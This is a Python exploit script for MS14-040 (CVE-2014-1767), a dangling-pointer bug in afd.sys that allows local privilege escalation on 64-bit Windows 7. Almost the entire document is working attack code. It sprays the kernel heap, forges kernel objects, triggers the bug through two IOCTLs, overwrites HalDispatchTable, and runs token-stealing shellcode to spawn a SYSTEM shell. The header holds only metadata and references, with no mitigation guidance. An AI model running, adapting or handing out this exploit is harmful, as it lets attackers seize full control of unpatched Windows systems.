# Exploit Title: MS14-040 - AFD.SYS Dangling Pointer
# Date: 2016-03-03
# Exploit Author: Rick Larabee
# Vendor Homepage: www.microsoft.com
# Version: Windows 7, 64 bit
# Tested on: Win7 x64
#        afd.sys - 6.1.7601.17514
#        ntdll.dll - 6.1.7601.17514 
#
# CVE : CVE-2014-1767
# Category: Local Privilege Escalation
# References:
#   http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf
#   http://ricklarabee.blogspot.com/
#   https://warroom.securestate.com/ms14-040-afd-sys-dangling-pointer-further-analysis/
#   https://technet.microsoft.com/en-us/library/security/ms14-040.aspx
#   http://www.cvedetails.com/cve/CVE-2014-1767/
#   https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/
#
# Greetz: PWN4GEPWN1E, SecurityMook


from ctypes import *
import socket, time, os, struct, sys
from ctypes.wintypes import HANDLE, DWORD
import platform

kernel32 = windll.kernel32
ntdll    = windll.ntdll
Psapi    = windll.Psapi

MEMRES     = (0x1000 | 0x2000)
PAGEEXE    = 0x40
Zerobits   = c_int(0)
RegionSize = c_ulonglong(0x1000)
written    = c_ulonglong(0)

FakeObjSize = 0x100

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
INVALID_HANDLE_VALUE = -1 

WSAGetLastError          = windll.Ws2_32.WSAGetLastError
WSAGetLastError.argtypes = ()
WSAGetLastError.restype  = c_int
SOCKET                   = c_int
WSASocket                = windll.Ws2_32.WSASocketA
WSASocket.argtypes       = (c_int, c_int, c_int, c_void_p, c_uint, DWORD)
WSASocket.restype        = SOCKET
closesocket              = windll.Ws2_32.closesocket
closesocket.argtypes     = (SOCKET,)
closesocket.restype      = c_int
connect                  = windll.Ws2_32.connect
connect.argtypes         = (SOCKET, c_void_p, c_int)
connect.restype          = c_int
HalDispatchTable         = c_uint64   

class sockaddr_in(Structure):
    _fields_ = [
        ("sin_family", c_short),
        ("sin_port", c_ushort),
        ("sin_addr", c_ulong),
        ("sin_zero", c_char * 8),
        ]   

kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong, c_char_p,  c_ulonglong, POINTER(c_ulonglong)]        
ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong),c_ulonglong,c_ulonglong]

def find_driver_base(driver=None):
	#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
	
	if platform.architecture()[0] == '64bit':
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		Psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		#if process_is_wow64():
		#	raise RuntimeError('python running in WOW64 is not supported')
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	Psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
	for base_addr in lpImageBase:
		driver_name = c_char_p('\x00' * driver_name_size.value)
		if base_addr:
			Psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				return (base_addr, driver_name.value)
	return None		

def get_haldispatchtable():
    #https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py

	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	(krnlbase, kernelver) = find_driver_base()
	hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
	halDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
	halDispatchTable -= hKernel
	halDispatchTable += krnlbase
	return halDispatchTable

    
def CreateBuffer1(inbuf1addr):
    print "[+] Creating Buffer for IOCTL 0x1207F (afdTransmitFile) at: ", hex(inbuf1addr)
    inbuf1size = 0x40
    targetsize = 0x100
    virtualAddress = 0x13371337
    mdlsize = (pow(2, 0x0c) * (targetsize -0x30) / 8) - 0xfff - (virtualAddress & 0xfff) 

   
    inbuf1  = "\x41" * 0x20
    inbuf1 += struct.pack("Q", virtualAddress)    #0x1a
    inbuf1 += struct.pack("Q", mdlsize)
    inbuf1 += "\x42" * 4
    inbuf1 += "\x43" * 4
    inbuf1 += "\x01\x00\x00\x00"
    inbuf1 += "\x00\x00\x00\x00"
    inbuf1 += "\x00" * (inbuf1size - len(inbuf1))
       
    baseadd    = c_ulonglong(0x1001)
    
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE)

    wpmStatus = kernel32.WriteProcessMemory(-1, inbuf1addr, inbuf1, inbuf1size, byref(written))
    
def CreateBuffer2(inbuf2addr):
    print "[+] Creating Buffer for IOCTL 0x120C3 (afdTransmitPacket) at: ", hex(inbuf2addr)
    inbuf2size = 0x18
    addrforbuf2 = 0x0AAAAAAA
   
    inbuf2 = struct.pack("Q", 0x1)
    inbuf2 += struct.pack("Q", addrforbuf2)
    inbuf2 += "\x00" * (inbuf2size -len(inbuf2))
       
    baseadd    = c_ulonglong(inbuf2addr+1)
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE) 
    kernel32.WriteProcessMemory(-1, inbuf2addr, inbuf2, inbuf2size, byref(written))

def CreateFakeObject(firstWrite,fakeobjectaddr, setinfoworkerfactory):
    print "[+] Print creating fakeobject at ", hex(fakeobjectaddr)
    
    fakeobject2addr = setinfoworkerfactory - 0x18

    fakeobject2 = "\x00"*0x18 + struct.pack("Q", firstWrite)
    fakeobj2size = len(fakeobject2)
    kernel32.WriteProcessMemory(-1, fakeobject2addr, fakeobject2, fakeobj2size, byref(written))

    objhead = ("\x00\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
               "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
               "\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x08\x00\x00\x00\x00\x00"
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")

    fakeobject = objhead
    fakeobject += struct.pack("Q", fakeobject2addr) + "\x41"*96
    fakeobject += "\x42" * (FakeObjSize - len(fakeobject))
    kernel32.WriteProcessMemory(-1, fakeobjectaddr, fakeobject, FakeObjSize, byref(written))   

def main():
    print "[+] creating socket..."
    sock = WSASocket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, None, 0, 0)

    if sock == -1:
        print "[-] no luck creating socket!"
        sys.exit(1)

    print "[+] got sock 0x%x" % sock

    addr = sockaddr_in()
    addr.sin_family = socket.AF_INET
    addr.sin_port = socket.htons(135)
    addr.sin_addr = socket.htonl(0x7f000001)

    connect(sock, byref(addr), sizeof(addr))

    print "[+] sock connected."
    print "[+] fill kernel heap"

    rgnarr = []
    nBottomRect = 0x02aaaaaa
    while(1):
        hrgn = windll.gdi32.CreateRoundRectRgn(0,0,1,nBottomRect,1,1)

        if hrgn == 0:
            break
        rgnarr.append(hrgn)
        print ".",


    print "\n[+] GO!"
    HalDispatchTable = get_haldispatchtable()
    print "[+] HalDispatchTable address:", hex(HalDispatchTable)
    # Win7 - x64 
    (halbase, dllname) = find_driver_base("hal.dll")
    OS = "7"
    if OS == "7":
        HaliQuerySystemInformation = halbase+0x398e8 # Offset for win7 x64
        _KPROCESS = "\x70"
        _TOKEN    = "\x08\x02"
        _UPID     = "\x80\x01"
        _APLINKS  = "\x88\x01"   

    print "[+] HaliQuerySystemInformation:", hex(HaliQuerySystemInformation)

    IoStatus = c_ulonglong()
    IoStatusBlock = c_ulonglong()

    addrSetInfoWorkerFactory = 0x2218
    firstWriteAddr  = HalDispatchTable + 0x8 - 0x2C
    secondWriteAddr = firstWriteAddr + 0x4
    thirdWriteAddr = firstWriteAddr + 0x1

    shellcode_address   = c_ulonglong
    shellcode_address   = 0x0000000000002500
    what_address        = 0x0000250800002500
    what_part1          = what_address & 0xfffffff
    what_part2          = what_address >> 32 & 0xfffffff

    inbuf1 = 0x1000
    inbuf2 = 0x2000
    hWF = c_ulonglong(0)
    FakeWorkerFactoryADDR = 0x2100

    CreateBuffer1(inbuf1)
    CreateBuffer2(inbuf2)
    CreateFakeObject(firstWriteAddr, FakeWorkerFactoryADDR, addrSetInfoWorkerFactory)
    print ""
    print ""
    print "[*] Trigger IOCTL 0x1207f (afdTransmitFile) to setup the memory "
    print "[*] structures for phase 2 and fil the freed space with a "
    print "[*] WorkerFactory Object"
    raw_input("[+] Press Enter to trigger phase 1")
    ntdll.ZwDeviceIoControlFile.argtypes = [c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong, POINTER(c_ulonglong), 
                                            c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong]
    status = ntdll.ZwDeviceIoControlFile(sock,0x0,0x0,0x0,byref(IoStatusBlock),0x1207f, inbuf1, 0x40, 0x0, 0x0)


    kernel32.CreateIoCompletionPort.argtypes = [c_ulonglong,c_ulonglong,c_ulonglong,c_ulonglong]
    CompletionPort = HANDLE(kernel32.CreateIoCompletionPort( INVALID_HANDLE_VALUE, 0, 0, 0))

    ntdll.ZwCreateWorkerFactory.argtypes = [POINTER(c_ulonglong), c_ulonglong, c_ulonglong, c_void_p, c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong, c_ulonglong]
    ntdll.ZwCreateWorkerFactory(byref(hWF),GENERIC_ALL,0,CompletionPort,INVALID_HANDLE_VALUE,0,0,0,0,0)
    hWFaddr = hWF


    padding           = "\x90"*8
    HalDispatchTable0x8 = HalDispatchTable + 0x8

    sc_pointer = struct.pack("Q", shellcode_address+0x10)
    sc_pointer += struct.pack("Q", 0x25)   

    restore_ptrs =  "\x41\x51"                                                  +\
                    "\x41\x52"                                                  +\
                    "\x41\x53"                	                                +\
                    "\x49\xb9" + struct.pack("Q", HaliQuerySystemInformation)   +\
                    "\x49\xba" + struct.pack("Q", HalDispatchTable0x8)          +\
                    "\x4d\x89\x0a"
                    
    tokenstealing = "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      +\
                    "\x4D\x8B\x89" + _KPROCESS + "\x00\x00\x00" +\
                    "\x4D\x89\xCA"                              +\
                    "\x4D\x8B\x89" + _APLINKS + "\x00\x00"      +\
                    "\x49\x81\xE9" + _APLINKS + "\x00\x00"      +\
                    "\x49\x83\xB9" + _UPID + "\x00\x00\x04"     +\
                    "\x75\xe8"                                  +\
                    "\x4D\x8B\x89" + _TOKEN + "\x00\x00"        +\
                    "\x4D\x89\x8A" + _TOKEN + "\x00\x00"       

    fixobjheaders = "\x4d\x8b\x92\x00\x02\x00\x00" 	        +\
                    "\x4d\x89\xd1"             	            +\
                    "\x4d\x8b\x12"             	            +\
                    "\x41\xbb" + struct.pack("L", hWF.value)+\
                    "\x41\x83\xe3\xfc"                      +\
                    "\x4d\x01\xdb"                          +\
                    "\x4d\x01\xdb"                          +\
                    "\x4d\x01\xda"             	            +\
                    "\x49\xc7\x02\x00\x00\x00\x00" 	        +\
                    "\x49\x83\xc1\x58"          	        +\
                    "\x4d\x89\xca"             	            +\
                    "\x4d\x8b\x09"             	            +\
                    "\x49\x83\xe9\x01"                      +\
                    "\x4d\x89\x0a"             	            +\
                    "\x41\x5b"                              +\
                    "\x41\x5A"                              +\
                    "\x41\x59"                              +\
                    "\xc3" 
                   
    shellcode = sc_pointer + padding + restore_ptrs + tokenstealing + fixobjheaders
    shellcode_size    = len(shellcode)

    print "\n\n[+] Writing Shellcode at address: ", hex(shellcode_address)

    kernel32.WriteProcessMemory(-1, shellcode_address, shellcode, shellcode_size, byref(written))

    print "\n\n[*] Triggering IOCTL 0x120c3 (afdTransmitPackets) to free the"
    print "[*] WorkerFactory object created above and fill the freed object"
    print "[*] with a user controlled object to perform the necessary overwrites"
    raw_input("[+] Press Enter to trigger phase 2")

    ### Trigger 2
    ## afd!AfdTransmitPackets
    ntdll.ZwDeviceIoControlFile(sock,0x0,0x0,0x0,byref(IoStatusBlock),0x120c3, inbuf2, 0x18, 0x0, 0x0)

    ntdll.ZwQueryEaFile(INVALID_HANDLE_VALUE, byref(IoStatus), None, 0, False, FakeWorkerFactoryADDR, FakeObjSize-0x04, None, False)
    ntdll.ZwSetInformationWorkerFactory(hWF, 8, what_part1, 0x4) 
    kernel32.WriteProcessMemory(-1, addrSetInfoWorkerFactory, struct.pack("Q", secondWriteAddr), 0x8, byref(written))
    ntdll.ZwSetInformationWorkerFactory(hWF, 8, what_part2, 0x4) 
    kernel32.WriteProcessMemory(-1, addrSetInfoWorkerFactory, struct.pack("Q", thirdWriteAddr), 0x8, byref(written))
    ntdll.ZwSetInformationWorkerFactory(hWF, 8, what_part2, 0x4) ;

    inp  = c_long()
    out  = c_long()
    inp  = 0x1337
    qip = ntdll.NtQueryIntervalProfile(inp, byref(out))
    print "[*] Spawning a SYSTEM shell..."
    os.system("cmd.exe /K cd c:\\windows\\system32")


if __name__ == "__main__":
    if platform.architecture()[0] == '64bit':
        main()
    else:
        print "Please use a 64 bit version of python"
        sys.exit()



